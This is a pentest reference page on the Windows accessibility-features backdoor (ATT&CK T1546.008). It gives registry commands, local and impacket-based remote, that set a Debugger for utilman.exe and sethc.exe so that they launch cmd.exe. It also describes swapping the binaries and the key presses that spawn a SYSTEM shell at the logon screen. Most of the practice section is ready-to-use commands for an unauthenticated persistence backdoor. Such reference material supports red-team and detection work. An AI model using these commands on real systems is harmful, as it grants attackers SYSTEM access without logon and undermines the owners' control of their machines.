---
description: >-
  MITRE ATT&CK™  Event Triggered Execution - Accessibility Features - Technique
  T1546.008
---

# Accessibility features Backdoor

## Theory

The concept here is pretty simple. Windows supports some built in accessibility features like Sticky Keys, Utilman, Narrator, Magnify that are available at pre-logon (at the login screen, either via a physical console or via Remote Desktop). Replacing them by cmd.exe live us with a SYSTEM access at pre-logon.

## Practice

{% tabs %}
{% tab title="Utilman.exe" %}
We can replace the `C:\Windows\System32\Utilman.exe` with a cmd.exe and rename it (utilman.exe). You may need to change utilman.exe owner to yourself first as TrustedIntaller may be giving you a hard time.

An other way is just to edit the [Image File Execution Options](registry/image-file-execution-options.md) registry

```bash
#Windows
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

#Linux (with impacket)
reg.py <USER>:<PASSWORD>@<TARGET> add -keyName "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" -vt REG_SZ -v Debugger -vd "C:\windows\system32\cmd.exe"
```

Know, press `Windows Key`+`U` to spawn an elevated shell
{% endtab %}

{% tab title="Sethc.exe" %}
We can replace the `C:\Windows\System32\sethc.exe` with a cmd.exe and rename it (sethc.exe). You may need to change sethc.exe owner to yourself first as TrustedIntaller may be giving you a hard time.

An other way is just to edit the [Image File Execution Options](registry/image-file-execution-options.md) registry

```bash
#Windows
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

#Linux (with impacket)
reg.py <USER>:<PASSWORD>@<TARGET> add -keyName "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -vt REG_SZ -v Debugger -vd "C:\windows\system32\cmd.exe"
```

Know, press `Shift Key` 5 time to spawn an elevated shell
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6" %}

{% embed url="https://pentestlab.blog/2019/11/13/persistence-accessibility-features/" %}
